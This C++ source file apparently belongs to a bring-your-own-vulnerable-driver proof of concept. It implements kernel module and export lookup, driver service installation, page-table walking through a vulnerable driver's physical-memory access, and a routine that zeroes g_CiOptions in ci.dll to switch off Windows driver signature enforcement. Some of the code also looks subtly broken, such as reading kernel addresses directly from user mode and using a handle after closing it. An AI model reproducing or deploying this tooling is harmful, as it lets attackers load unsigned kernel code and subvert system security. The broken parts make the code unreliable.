/**
 * @file Utils.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the implementation of the Utils namespace.
 *
 * Implements the helper functions for kernel and driver interactions,
 * such as finding kernel module base addresses and managing driver services.
 */

#include "Utils.h"
#include "Providers/IProvider.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <cstring> // For strnlen
#include <Psapi.h>
#include <winternl.h>

// --- BUG-008 FIX: Proper structs for PML4 scanning ---
typedef struct _KSPECIAL_REGISTERS {
    ULONG64 Cr0;
    ULONG64 Cr2;
    ULONG64 Cr3;
    ULONG64 Cr4;
    ULONG64 KernelDr0;
    ULONG64 KernelDr1;
    ULONG64 KernelDr2;
    ULONG64 KernelDr3;
    ULONG64 KernelDr6;
    ULONG64 KernelDr7;
    ULONG64 Gdtr[2];
    ULONG64 Idtr[2];
    USHORT Tr;
    USHORT Ldtr;
    ULONG MxCsr;
    ULONG64 DebugControl;
    ULONG64 LastBranchToRip;
    ULONG64 LastBranchFromRip;
    ULONG64 LastExceptionToRip;
    ULONG64 LastExceptionFromRip;
    ULONG64 Cr8;
    ULONG64 MsrGsBase;
    ULONG64 MsrGsSwap;
    ULONG64 MsrStar;
    ULONG64 MsrLStar;
    ULONG64 MsrCStar;
    ULONG64 MsrSyscallMask;
    ULONG64 Xcr0;
} KSPECIAL_REGISTERS, *PKSPECIAL_REGISTERS;

typedef struct _KPROCESSOR_STATE {
    KSPECIAL_REGISTERS SpecialRegisters;
    CONTEXT ContextFrame;
} KPROCESSOR_STATE, *PKPROCESSOR_STATE;

typedef struct _FAR_JMP_16 {
    UCHAR  OpCode;  // 0xe9
    USHORT Offset;
} FAR_JMP_16;

typedef struct _PSEUDO_DESCRIPTOR_32 {
    USHORT Limit;
    ULONG Base;
} PSEUDO_DESCRIPTOR_32;

#pragma pack(push, 8) 
typedef struct _KGDTENTRY64 {
    USHORT  LimitLow;
    USHORT  BaseLow;
    union {
        struct {
            UCHAR   BaseMiddle;
            UCHAR   Flags1;
            UCHAR   Flags2;
            UCHAR   BaseHigh;
        } Bytes;
        struct {
            ULONG   BaseMiddle : 8;
            ULONG   Type : 5;
            ULONG   Dpl : 2;
            ULONG   Present : 1;
            ULONG   LimitHigh : 4;
            ULONG   System : 1;
            ULONG   LongMode : 1;
            ULONG   DefaultBig : 1;
            ULONG   Granularity : 1;
            ULONG   BaseHigh : 8;
        } Bits;
    } W;
    ULONG   BaseUpper;
    ULONG   MustBeZero;
} KGDTENTRY64, *PKGDTENTRY64;
#pragma pack(pop)

typedef struct _FAR_TARGET_32 {
    ULONG Offset;
    USHORT Selector;
} FAR_TARGET_32;

typedef struct _PROCESSOR_START_BLOCK {
    FAR_JMP_16 Jmp;
    ULONG CompletionFlag;
    PSEUDO_DESCRIPTOR_32 Gdt32;
    PSEUDO_DESCRIPTOR_32 Idt32;
    KGDTENTRY64 Gdt[4]; 
    ULONG64 TiledCr3;
    FAR_TARGET_32 PmTarget;
    FAR_TARGET_32 LmIdentityTarget;
    PVOID LmTarget;
    struct _PROCESSOR_START_BLOCK* SelfMap;
    ULONG64 MsrPat;
    ULONG64 MsrEFER;
    KPROCESSOR_STATE ProcessorState;
} PROCESSOR_START_BLOCK;


// Undocumented SYSTEM_INFORMATION_CLASS value
#define SystemModuleInformation 11

// RtlOffsetToPointer macro (Windows internal)
#define RtlOffsetToPointer(Base, Offset) ((PCHAR)(((PCHAR)(Base)) + ((ULONG_PTR)(Offset))))

// Function prototype for NtQuerySystemInformation
typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// Structures for NtQuerySystemInformation
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

// Handle Information structures
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

#define SystemHandleInformation 16


namespace KernelMode {
    namespace Utils {

        ModuleInfo GetKernelModuleInfo(const std::string& moduleName) {
            ULONG modulesSize = 0;
            std::vector<char> modulesBuffer;
            NTSTATUS status = 0;

            // NtQuerySystemInformation is the de-facto way to get kernel module info.
            auto NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
            if (!NtQuerySystemInformation) {
                std::wcerr << L"[-] Could not resolve NtQuerySystemInformation." << std::endl;
                return { 0, 0 };
            }

            // First call to get the size
            status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, nullptr, 0, &modulesSize);
            if (modulesSize == 0) {
                // Sometimes it returns error but gives size. If strictly 0, we can't proceed.
                // However, usually we can guess a size if it fails, but let's stick to standard flow.
                 // Retrying with a fixed buffer size if 0 is sometimes a strategy, but let's trust the API for now.
                 // If status was success for 0 size? Unlikely.
            }
            
            // Often we need a bit more buffer than what was returned
            modulesSize += 4096;
            modulesBuffer.resize(modulesSize);

            // Second call to get the data
            status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, modulesBuffer.data(), modulesSize, nullptr);
            if (status != 0) { // 0 is STATUS_SUCCESS
                std::wcerr << L"[-] NtQuerySystemInformation failed with status: " << std::hex << status << std::endl;
                return { 0, 0 };
            }

            auto modules = (PRTL_PROCESS_MODULES)modulesBuffer.data();
            for (ULONG i = 0; i < modules->NumberOfModules; ++i) {
                // --- BUG-003 FIX: Safe String Handling ---
                const auto& mod = modules->Modules[i];
                if (mod.OffsetToFileName >= 256) {
                    continue; // Offset out of bounds of FullPathName[256]
                }

                // Ensure null termination safe read
                const char* nameStart = (const char*)mod.FullPathName + mod.OffsetToFileName;
                size_t maxLen = 256 - mod.OffsetToFileName;
                size_t actualLen = strnlen(nameStart, maxLen);
                
                if (actualLen == maxLen && maxLen > 0 && nameStart[maxLen-1] != 0) {
                    // String not null terminated within buffer
                     continue; 
                }

                std::string currentModuleName(nameStart, actualLen);
                // -----------------------------------------

                if (_stricmp(currentModuleName.c_str(), moduleName.c_str()) == 0) {
                    return { (uintptr_t)modules->Modules[i].ImageBase, modules->Modules[i].ImageSize };
                }
            }

            return { 0, 0 };
        }

        uintptr_t GetKernelModuleBase(const std::string& moduleName) {
            return GetKernelModuleInfo(moduleName).BaseAddress;
        }

        uintptr_t GetKernelExport(uintptr_t moduleBase, const std::string& functionName, const std::string& moduleName) {
            // This function must parse the PE header of the kernel module to find the export address.
            // Since we cannot read kernel memory directly without a driver, we load the corresponding
            // module from disk into our user-space process as a data file (DONT_RESOLVE_DLL_REFERENCES).
            // We then find the export RVA and apply it to the logical kernel base address.

            // 1. Construct path to the system module
            wchar_t systemDirectory[MAX_PATH];
            if (!GetSystemDirectoryW(systemDirectory, MAX_PATH)) {
                return 0;
            }

            std::wstring fullPath(systemDirectory);
            fullPath += L"\\";
            
            // Convert moduleName to wstring
            std::wstring wModuleName(moduleName.begin(), moduleName.end());
            fullPath += wModuleName;

            // 2. Load the module into user space
            HMODULE moduleHandle = LoadLibraryExW(fullPath.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
            if (!moduleHandle) {
                // Try fallback to just the module name (in case it's in current dir or PATH)
                moduleHandle = LoadLibraryExW(wModuleName.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
                if (!moduleHandle) {
                    std::wcerr << L"[-] Failed to load module for export resolution: " << fullPath << std::endl;
                    return 0;
                }
            }

            // 3. Get the export address in user space
            uintptr_t functionAddress = (uintptr_t)GetProcAddress(moduleHandle, functionName.c_str());
            if (!functionAddress) {
                FreeLibrary(moduleHandle);
                return 0;
            }

            // 4. Calculate RVA and apply to kernel base
            // The address from GetProcAddress is relative to the user-space loaded module base.
            uintptr_t rva = functionAddress - (uintptr_t)moduleHandle;
            uintptr_t kernelFunctionAddress = moduleBase + rva;

            FreeLibrary(moduleHandle);
            return kernelFunctionAddress;
        }

        SC_HANDLE CreateDriverService(const std::wstring& serviceName, const std::wstring& driverPath) {
            SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
            if (!scmHandle) {
                DWORD error = GetLastError();
                std::wcerr << L"[-] Failed to open SCM: " << error;
                if (error == ERROR_ACCESS_DENIED) {
                    std::wcerr << L" (Access Denied - Run as Administrator)";
                }
                std::wcerr << std::endl;
                return nullptr;
            }

            // Handle paths with spaces by quoting them if they aren't already
            std::wstring finalPath = driverPath;
            // Removed quoting logic as it breaks kernel driver loading (Error 123)
            // if (finalPath.find(L' ') != std::wstring::npos && finalPath.front() != L'\"') {
            //     finalPath = L"\"" + finalPath + L"\"";
            // }

            // DEBUGLOG PATH
            {
                 std::ofstream debug("C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\BYOVD-POC\\debug_output.txt", std::ios::app);
                 if (debug.is_open()) {
                     std::string fp(finalPath.begin(), finalPath.end());
                     debug << "[Utils] CreateDriverService for " << std::string(serviceName.begin(), serviceName.end()) << " using path: " << fp << std::endl;
                 }
            }

            SC_HANDLE serviceHandle = CreateServiceW(
                scmHandle,
                serviceName.c_str(),
                serviceName.c_str(),
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL,
                finalPath.c_str(),
                nullptr, nullptr, nullptr, nullptr, nullptr
            );

            if (!serviceHandle) {
                DWORD error = GetLastError();
                if (error == ERROR_SERVICE_EXISTS) {
                    std::wcout << L"[*] Service already exists, attempting to open existing service..." << std::endl;
                    serviceHandle = OpenServiceW(scmHandle, serviceName.c_str(), SERVICE_ALL_ACCESS);
                    if (!serviceHandle) {
                        std::wcerr << L"[-] Failed to open existing service: " << GetLastError() << std::endl;
                        CloseServiceHandle(scmHandle);
                        return nullptr;
                    }

                    // Stop the service first if running
                    SERVICE_STATUS status = { 0 };
                    if (QueryServiceStatus(serviceHandle, &status) && status.dwCurrentState != SERVICE_STOPPED) {
                        ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status);
                        // Wait/Loop logic would be better but keeping it simple
                        Sleep(500); 
                    }

                    // Update the binary path in case it changed
                    if (!ChangeServiceConfigW(
                        serviceHandle,
                        SERVICE_NO_CHANGE,
                        SERVICE_NO_CHANGE,
                        SERVICE_NO_CHANGE,
                        finalPath.c_str(), 
                        NULL, NULL, NULL, NULL, NULL, NULL)) {
                         std::wcerr << L"[!] Warning: Failed to update service path: " << GetLastError() << std::endl;
                         
                         // LOG FAILURE
                         {
                            std::ofstream debug("C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\BYOVD-POC\\debug_output.txt", std::ios::app);
                            if (debug.is_open()) debug << "[Utils] ChangeServiceConfigW FAILED. Error: " << GetLastError() << std::endl;
                         }

                    } else {
                         std::wcout << L"[+] Service path updated to: " << finalPath << std::endl;
                         
                         // LOG SUCCESS
                         {
                            std::ofstream debug("C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\BYOVD-POC\\debug_output.txt", std::ios::app);
                            if (debug.is_open()) debug << "[Utils] ChangeServiceConfigW Success." << std::endl;
                         }
                    }
                }
                else {
                    std::wcerr << L"[-] Failed to create service: " << error;
                    switch (error) {
                        case ERROR_ACCESS_DENIED:
                            std::wcerr << L" (Access Denied - Run as Administrator)";
                            break;
                        case ERROR_INVALID_PARAMETER:
                            std::wcerr << L" (Invalid Parameter - Check driver path)";
                            break;
                        case ERROR_INVALID_NAME:
                            std::wcerr << L" (Invalid Service Name)";
                            break;
                        case ERROR_SERVICE_EXISTS:
                            std::wcerr << L" (Service Already Exists)";
                            break;
                    }
                    std::wcerr << std::endl;
                    CloseServiceHandle(scmHandle);
                    return nullptr;
                }
            } else {
                std::wcout << L"[+] Service created successfully: " << serviceName << std::endl;
            }

            std::wcout << L"[*] Attempting to start service..." << std::endl;
            if (!StartServiceW(serviceHandle, 0, nullptr)) {
                DWORD error = GetLastError();

                // DEBUG LOGGING TO FILE
                {
                    std::ofstream debug("C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\BYOVD-POC\\debug_output.txt", std::ios::app);
                    if (debug.is_open()) {
                        std::string sn(serviceName.begin(), serviceName.end());
                        debug << "[Utils] StartService failed for: " << sn << " Error: " << error << std::endl;
                    }
                }

                if (error != ERROR_SERVICE_ALREADY_RUNNING) {
                    std::wcerr << L"[-] Failed to start service: " << error;
                    switch (error) {
                        case ERROR_ACCESS_DENIED:
                            std::wcerr << L" (Access Denied - Run as Administrator)";
                            break;
                        case ERROR_FILE_NOT_FOUND:
                            std::wcerr << L" (Driver file not found: " << driverPath << L")";
                            break;
                        case ERROR_BAD_EXE_FORMAT:
                            std::wcerr << L" (Bad executable format - Driver corruption or wrong architecture)";
                            break;
                        case ERROR_DRIVER_FAILED_PRIOR_UNLOAD:
                            std::wcerr << L" (Driver failed prior unload - Previous instance still loaded)";
                            break;
                        case ERROR_SERVICE_LOGON_FAILED:
                            std::wcerr << L" (Service logon failed - Driver signing/policy issue)";
                            break;
                        case 1275: // ERROR_DRIVER_BLOCKED
                            std::wcerr << L" (Error 1275 - Driver blocked by Windows security policy)";
                            break;
                        default:
                            if (error == 193) {
                                std::wcerr << L" (Error 193 - Driver signature verification failed, DSE blocking load)";
                            } else if (error == 577 || error == ERROR_INVALID_IMAGE_HASH) {
                                std::wcerr << L" (Error 577/Invalid hash - Driver signature verification failed)";
                            } else {
                                std::wcerr << L" (Unknown error code)";
                            }
                            break;
                    }
                    std::wcerr << std::endl;
                    
                    // Additional diagnostic information
                    std::wcerr << L"[*] Diagnostic: Checking driver file..." << std::endl;
                    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
                    if (GetFileAttributesExW(driverPath.c_str(), GetFileExInfoStandard, &fileInfo)) {
                        std::wcout << L"    Driver file exists and is accessible" << std::endl;
                        std::wcout << L"    File size: " << fileInfo.nFileSizeLow << L" bytes" << std::endl;
                    } else {
                        std::wcerr << L"    Driver file not accessible or missing!" << std::endl;
                    }
                    
                    CloseServiceHandle(serviceHandle);
                    CloseServiceHandle(scmHandle);
                    // Clean up the failed service
                    serviceHandle = OpenServiceW(scmHandle, serviceName.c_str(), DELETE);
                    if (serviceHandle) {
                        DeleteService(serviceHandle);
                        CloseServiceHandle(serviceHandle);
                    }
                    return nullptr;
                }
            } else {
                std::wcout << L"[+] Service started successfully" << std::endl;
            }

            CloseServiceHandle(scmHandle);
            return serviceHandle;
        }

        bool RemoveDriverService(SC_HANDLE serviceHandle) {
            if (!serviceHandle) return false;

            SERVICE_STATUS serviceStatus;
            ControlService(serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus);

            if (!DeleteService(serviceHandle)) {
                if (GetLastError() != ERROR_SERVICE_MARKED_FOR_DELETE) {
                     std::wcerr << L"[-] Failed to delete service: " << GetLastError() << std::endl;
                     CloseServiceHandle(serviceHandle);
                     return false;
                }
            }

            CloseServiceHandle(serviceHandle);
            return true;
        }

        size_t FindPattern(const void* data, size_t dataSize, const void* pattern, size_t patternSize, const char* mask) {
            if (!data || !pattern || dataSize < patternSize || patternSize == 0) {
                return SIZE_MAX;
            }

            const BYTE* dataBytes = static_cast<const BYTE*>(data);
            const BYTE* patternBytes = static_cast<const BYTE*>(pattern);

            // If no mask provided, use exact matching
            if (!mask) {
                for (size_t i = 0; i <= dataSize - patternSize; ++i) {
                    if (memcmp(&dataBytes[i], patternBytes, patternSize) == 0) {
                        return i;
                    }
                }
                return SIZE_MAX;
            }

            // Use mask-based matching
            for (size_t i = 0; i <= dataSize - patternSize; ++i) {
                bool found = true;
                for (size_t j = 0; j < patternSize; ++j) {
                    if (mask[j] == 'x' && dataBytes[i + j] != patternBytes[j]) {
                        found = false;
                        break;
                    }
                }
                if (found) {
                    return i;
                }
            }

            return SIZE_MAX;
        }

        uintptr_t FindCiOptionsAddress(uintptr_t ciModuleBase, size_t ciModuleSize) {
            if (!ciModuleBase || ciModuleSize == 0) {
                return 0;
            }

            // KDU-style pattern for "lea rcx, g_CiOptions"
            // Pattern: 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 8B C8
            const BYTE pattern[] = { 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x8B, 0xC8 };
            const char mask[] = "xxx????x????xx";

            size_t patternOffset = FindPattern(reinterpret_cast<void*>(ciModuleBase), ciModuleSize, pattern, sizeof(pattern), mask);
            
            if (patternOffset == SIZE_MAX) {
                return 0;
            }

            uintptr_t patternAddress = ciModuleBase + patternOffset;
            
            // Extract the RIP-relative offset from the lea instruction
            int32_t ripOffset = *reinterpret_cast<int32_t*>(patternAddress + 3);
            
            // Calculate the absolute address: instruction_end + offset
            uintptr_t instructionEnd = patternAddress + 7; // lea instruction is 7 bytes
            uintptr_t ciOptionsRva = instructionEnd - ciModuleBase + ripOffset;
            
            return ciOptionsRva;
        }

        HMODULE LoadKernelModule(const std::wstring& moduleName) {
            // Load the module from system32 directory
            std::wstring systemPath = L"C:\\Windows\\System32\\";
            systemPath += moduleName;
            
            HMODULE module = LoadLibraryW(systemPath.c_str());
            if (!module) {
                // Try loading from current directory as fallback
                module = LoadLibraryW(moduleName.c_str());
            }
            
            return module;
        }

        // ============================================================================
        // Authentic KDU Page Table Walking Implementation
        // ============================================================================

        // Page table walking constants from authentic KDU
        #define PHY_ADDRESS_MASK                0x000ffffffffff000ull
        #define PHY_ADDRESS_MASK_1GB_PAGES      0x000fffffc0000000ull
        #define PHY_ADDRESS_MASK_2MB_PAGES      0x000fffffffe00000ull
        #define VADDR_ADDRESS_MASK_1GB_PAGES    0x000000003fffffffull
        #define VADDR_ADDRESS_MASK_2MB_PAGES    0x00000000001fffffull
        #define VADDR_ADDRESS_MASK_4KB_PAGES    0x0000000000000fffull
        #define ENTRY_PRESENT_BIT               1
        #define ENTRY_PAGE_SIZE_BIT             0x0000000000000080ull

        // Function pointer types for provider callbacks (authentic KDU types)
        typedef BOOL(WINAPI* QueryPML4Routine)(
            _In_ HANDLE DeviceHandle,
            _Out_ ULONG_PTR* Value);

        typedef BOOL(WINAPI* ReadPhysicalMemoryRoutine)(
            _In_ HANDLE DeviceHandle,
            _In_ ULONG_PTR PhysicalAddress,
            _In_ PVOID Buffer,
            _In_ ULONG NumberOfBytes);

        /**
         * @brief Convert page table entry to physical address (authentic KDU implementation)
         * @param entry Page table entry value
         * @param phyaddr Output physical address
         * @return 1 if entry is present, 0 otherwise
         */
        int PageTableEntryToPhysicalAddress(ULONG_PTR entry, ULONG_PTR* phyaddr) {
            if (entry & ENTRY_PRESENT_BIT) {
                *phyaddr = entry & PHY_ADDRESS_MASK;
                return 1;
            }
            return 0;
        }

        /**
         * @brief Translate virtual address to physical using page table walking (authentic KDU implementation)
         * @param deviceHandle Handle to vulnerable driver
         * @param queryPML4Routine Function to query PML4 CR3 value
         * @param readPhysicalMemoryRoutine Function to read physical memory
         * @param virtualAddress Virtual address to translate
         * @param physicalAddress Output physical address
         * @return TRUE if translation succeeds, FALSE otherwise
         */
        BOOL VirtualToPhysical(
            _In_ HANDLE deviceHandle,
            _In_ QueryPML4Routine queryPML4Routine,
            _In_ ReadPhysicalMemoryRoutine readPhysicalMemoryRoutine,
            _In_ ULONG_PTR virtualAddress,
            _Out_ ULONG_PTR* physicalAddress)
        {
            ULONG_PTR pml4_cr3, selector, table, entry = 0;
            INT r, shift;

            *physicalAddress = 0;

            // Get PML4 value (CR3 register contents)
            if (queryPML4Routine(deviceHandle, &pml4_cr3) == 0) {
                SetLastError(ERROR_DEVICE_HARDWARE_ERROR);
                return FALSE;
            }

            // Start with PML4 table
            table = pml4_cr3 & PHY_ADDRESS_MASK;

            // Walk through page table hierarchy: PML4 -> PDPT -> PD -> PT
            for (r = 0; r < 4; r++) {
                // Calculate selector for current level
                shift = 39 - (r * 9);
                selector = (virtualAddress >> shift) & 0x1ff;

                // Read page table entry
                if (readPhysicalMemoryRoutine(deviceHandle,
                    table + selector * 8,
                    &entry,
                    sizeof(ULONG_PTR)) == 0)
                {
                    // Last error set by called routine
                    return FALSE;
                }

                // Check if entry is present and get next table address
                if (PageTableEntryToPhysicalAddress(entry, &table) == 0) {
                    SetLastError(ERROR_INVALID_ADDRESS);
                    return FALSE;
                }

                // Check for large pages (1GB or 2MB)
                if (entry & ENTRY_PAGE_SIZE_BIT) {
                    if (r == 1) {
                        // 1GB page
                        table &= PHY_ADDRESS_MASK_1GB_PAGES;
                        table += virtualAddress & VADDR_ADDRESS_MASK_1GB_PAGES;
                        *physicalAddress = table;
                        return TRUE;
                    }

                    if (r == 2) {
                        // 2MB page
                        table &= PHY_ADDRESS_MASK_2MB_PAGES;
                        table += virtualAddress & VADDR_ADDRESS_MASK_2MB_PAGES;
                        *physicalAddress = table;
                        return TRUE;
                    }
                }
            }

            // 4KB page - add page offset
            table += virtualAddress & VADDR_ADDRESS_MASK_4KB_PAGES;
            *physicalAddress = table;

            return TRUE;
        }

        /**
         * @brief Find PML4 value from low stub memory (authentic KDU implementation)
         * @param lowStub1M Pointer to mapped low 1MB memory
         * @return PML4 value or 0 if not found
         */
        ULONG_PTR GetPML4FromLowStub1M(ULONG_PTR lowStub1M) {
            ULONG_PTR PML4 = 0;
            ULONG offset = 0;

            // Authentic KDU PML4 detection algorithm
            // Look for valid PML4 patterns in low memory stub using PROCESSOR_START_BLOCK
            __try {
                // Search up to 1MB (0x100000)
                while (offset < 0x100000) {
                    offset += 0x1000; // Increment by page size
                    
                    if (offset >= 0x100000) break;

                    BYTE* ptr = (BYTE*)lowStub1M + offset;

                    // PROCESSOR_START_BLOCK->Jmp check
                    // Check for JMP (0xE9) and some flags? 
                    // 0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)ptr)
                    if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)ptr))
                        continue;

                    // PROCESSOR_START_BLOCK->LmTarget check
                    // Must be a kernel address (0xfffff8...)
                    ULONG lmTargetOffset = FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget);
                    // 0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget)))
                    if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(ptr + lmTargetOffset)))
                        continue;

                    // Cr3 check
                    ULONG cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) + 
                                       FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);

                    // 0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset) should be 0 (aligned and clean?)
                    if (0xffffff0000000fff & *(UINT64*)(ptr + cr3_offset))
                        continue;

                    PML4 = *(UINT64*)(ptr + cr3_offset);
                    break;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                PML4 = 0;
            }

            return PML4;
        }

        ULONG GetWindowsBuildNumber() {
            OSVERSIONINFOEXW osvi = {};
            osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

            // Use RtlGetVersion for accurate version info
            typedef NTSTATUS(WINAPI* PFN_RtlGetVersion)(PRTL_OSVERSIONINFOW);
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (hNtdll) {
                PFN_RtlGetVersion pfnRtlGetVersion = (PFN_RtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
                if (pfnRtlGetVersion) {
                    if (NT_SUCCESS(pfnRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi))) {
                        return osvi.dwBuildNumber;
                    }
                }
            }

            // Fallback to GetVersionEx
            #pragma warning(push)
            #pragma warning(disable: 4996) // Suppress deprecation warning
            if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
                return osvi.dwBuildNumber;
            }
            #pragma warning(pop)

            return 0;  // Unable to retrieve
        }

        uintptr_t GetKernelObjectAddress(HANDLE handle) {
            auto NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
            if (!NtQuerySystemInformation) return 0;

            ULONG bytes = 0;
            NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, nullptr, 0, &bytes);
            
            // Allocate slightly more
            bytes += 16 * 1024;
            std::vector<uint8_t> buffer(bytes);
            
            NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer.data(), bytes, nullptr);
            if (status != 0) {
                 return 0;
            }

            PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer.data();
            DWORD processId = GetCurrentProcessId();

            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
                if (handleInfo->Handles[i].UniqueProcessId == processId && 
                    (HANDLE)handleInfo->Handles[i].HandleValue == handle) {
                    return (uintptr_t)handleInfo->Handles[i].Object;
                }
            }
            return 0;
        }

        uintptr_t VirtualToPhysical(Providers::IProvider* provider, uintptr_t virtualAddress) {
            static uintptr_t dirBase = 0;
            
            if (dirBase == 0) {
                const size_t lowStubSize = 0x100000;
                std::unique_ptr<uint8_t[]> buffer = std::make_unique<uint8_t[]>(lowStubSize);
                
                if (provider->ReadPhysicalMemory(0, buffer.get(), lowStubSize)) {
                    dirBase = GetPML4FromLowStub1M((ULONG_PTR)buffer.get());
                }
                
                if (dirBase == 0) {
                     std::wcerr << L"[-] Failed to find PML4 base via low stub scan." << std::endl;
                     return 0;
                }
            }

            unsigned short PML4 = (unsigned short)((virtualAddress >> 39) & 0x1FF);
            unsigned short DirectoryPtr = (unsigned short)((virtualAddress >> 30) & 0x1FF);
            unsigned short Directory = (unsigned short)((virtualAddress >> 21) & 0x1FF);
            unsigned short Table = (unsigned short)((virtualAddress >> 12) & 0x1FF);

            uintptr_t pml4Entry = 0;
            if (!provider->ReadPhysicalMemory(dirBase + PML4 * 8, &pml4Entry, sizeof(pml4Entry))) return 0;
            if ((pml4Entry & 1) == 0) return 0;

            uintptr_t pdptEntry = 0;
            uintptr_t pdptBase = pml4Entry & 0xFFFFFFFFFF000;
            if (!provider->ReadPhysicalMemory(pdptBase + DirectoryPtr * 8, &pdptEntry, sizeof(pdptEntry))) return 0;
            if ((pdptEntry & 1) == 0) return 0;
            
            if ((pdptEntry & 0x80) != 0) {
                 return (pdptEntry & 0xFFFFFC0000000) + (virtualAddress & 0x3FFFFFFF);
            }

            uintptr_t pdEntry = 0;
            uintptr_t pdBase = pdptEntry & 0xFFFFFFFFFF000;
            if (!provider->ReadPhysicalMemory(pdBase + Directory * 8, &pdEntry, sizeof(pdEntry))) return 0;
            if ((pdEntry & 1) == 0) return 0;
            
            if ((pdEntry & 0x80) != 0) {
                 return (pdEntry & 0xFFFFFFFE00000) + (virtualAddress & 0x1FFFFF);
            }

            uintptr_t ptEntry = 0;
            uintptr_t ptBase = pdEntry & 0xFFFFFFFFFF000;
            if (!provider->ReadPhysicalMemory(ptBase + Table * 8, &ptEntry, sizeof(ptEntry))) return 0;
            if ((ptEntry & 1) == 0) return 0;

            uintptr_t basePhys = ptEntry & 0xFFFFFFFFFF000;
            return basePhys + (virtualAddress & 0xFFF);
        }

        bool PatchCiOptions(Providers::IProvider* provider) {
             ModuleInfo ciInfo = GetKernelModuleInfo("ci.dll");
             if (ciInfo.BaseAddress == 0) {
                 std::wcerr << L"[-] Failed to get ci.dll module info." << std::endl;
                 return false;
             }
             
             uintptr_t ciOptionsVa = FindCiOptionsAddress(ciInfo.BaseAddress, ciInfo.ImageSize);
             if (ciOptionsVa == 0) {
                 std::wcerr << L"[-] Failed to find g_CiOptions address." << std::endl;
                 return false;
             }
             
             std::wcout << L"[+] g_CiOptions found at: 0x" << std::hex << ciOptionsVa << std::endl;
             
             ULONG zero = 0;
             if (provider->WriteKernelMemory(ciOptionsVa, &zero, sizeof(ULONG))) {
                  std::wcout << L"[+] Successfully patched g_CiOptions to 0." << std::endl;
                  return true;
             }
             
             std::wcerr << L"[-] Failed to write g_CiOptions." << std::endl;
             return false;
        }
    }
}